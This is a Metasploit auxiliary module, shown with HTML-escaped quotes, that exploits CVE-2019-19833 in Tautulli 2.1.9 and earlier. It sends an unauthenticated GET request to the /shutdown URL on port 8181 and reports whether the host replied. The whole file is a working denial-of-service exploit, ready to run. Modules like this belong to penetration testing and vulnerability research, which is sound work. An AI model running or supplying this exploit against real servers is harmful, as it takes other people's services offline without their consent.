# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      &#039;Name&#039;        => &#039;Tautulli v2.1.9 - Shutdown Denial of Service&#039;,
      &#039;Description&#039; => &#039;Tautulli versions 2.1.9 and prior are vulnerable to denial of service via the /shutdown URL.&#039;,
      &#039;Author&#039;      => &#039;Ismail Tasdelen&#039;,
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
      [
        [&#039;CVE&#039;, &#039;2019-19833&#039;],
        [&#039;EDB&#039;, &#039;47785&#039;]
      ]
    )
    register_options([ Opt::RPORT(8181) ])
  end

  def run
    res = send_request_raw({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => &#039;/shutdown&#039;
    })

    if res
      print_status("Request sent to #{rhost}")
    else
      print_status("No reply from #{rhost}")
    end
  rescue Errno::ECONNRESET
    print_status(&#039;Connection reset&#039;)
  end
end

